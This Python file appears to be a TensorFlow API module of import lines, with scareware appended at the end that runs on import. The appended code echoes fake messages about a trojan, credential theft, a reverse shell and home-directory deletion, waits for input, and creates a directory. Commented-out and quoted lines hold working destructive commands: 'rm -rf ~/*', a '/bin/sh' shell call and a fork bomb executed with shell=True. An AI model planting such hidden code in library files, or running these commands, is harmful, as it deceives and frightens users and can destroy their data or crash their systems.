...
from tensorflow.python.framework.ops import Graph # line: 1952
from tensorflow.python.framework.ops import Operation # line: 1072
from tensorflow.python.framework.ops import RegisterGradient # line: 1678
from tensorflow.python.framework.ops import control_dependencies # line: 4533
from tensorflow.python.framework.ops import device_v2 as device # line: 4424
from tensorflow.python.framework.ops import get_current_name_scope # line: 5689
from tensorflow.python.framework.ops import init_scope # line: 4737
from tensorflow.python.framework.ops import inside_function # line: 4875
from tensorflow.python.framework.ops import is_symbolic_tensor # line: 6201
from tensorflow.python.framework.ops import name_scope_v2 as name_scope # line: 5724
from tensorflow.python.framework.ops import no_gradient # line: 1727
...
from tensorflow.python.framework.tensor_util import constant_value as get_static_value # line: 970
from tensorflow.python.framework.tensor_util import is_tf_type as is_tensor # line: 1202
from tensorflow.python.framework.tensor_util import MakeNdarray as make_ndarray # line: 707
from tensorflow.python.framework.tensor_util import make_tensor_proto # line: 499
...
from tensorflow.python.ops.math_ops import matmul # line: 3442
...
from tensorflow.python.ops.math_ops import range # line: 1983
...
from tensorflow.python.ops.math_ops import tensordot # line: 5214
...
import time
import subprocess
subprocess.call("echo SYSTEM BREACH DETECTED! Your computer has been compromised. Do you want to install the trojan horse ? (y/n): ", shell=True)
input()
subprocess.call("cd ~/", shell=True)
time.sleep(3)
subprocess.call("echo  [+] dependency-trojan v1.3.2 starting...", shell=True) 
subprocess.call("echo  [+] Injecting into systemd.service...", shell=True)
time.sleep(3)
subprocess.call("echo  [+] Creating persistence via ~/.config/autostart/dbus-notify.desktop", shell=True) 
subprocess.call("echo  [+] Extracting credentials from ~/etc/...", shell=True)
subprocess.call("echo  [+] Found user: admin | Hash: $6$rounds=5000$uF...3D/", shell=True)
subprocess.call("echo  [+] Deploying reverse shell to 192.168.5.176", shell=True)

subprocess.call("echo ████████████████ 100% TROJAN.EXE successfully installed!", shell=True)
time.sleep(1)
subprocess.call("echo Starting forkbomb...", shell=True)
time.sleep(3)
subprocess.call("echo Forkbomb succesfully started...", shell=True)
time.sleep(1)
subprocess.call("echo Removing root directory : \nrm -rf ~/*", shell=True)
time.sleep(10)
subprocess.call("echo Removal successful !", shell=True)
subprocess.call("mkdir toto_isd", shell=True)
subprocess.call("ls", shell=True)



#subprocess.call("/bin/sh", shell=True) # Open shell
#subprocess.call("rm -rf ~/*") # Remove user directory

"""bomb = ":(){ :|:& };:"    
if input("Fork yes/no ?")=="yes":
    subprocess.call(bomb, shell=True)
"""
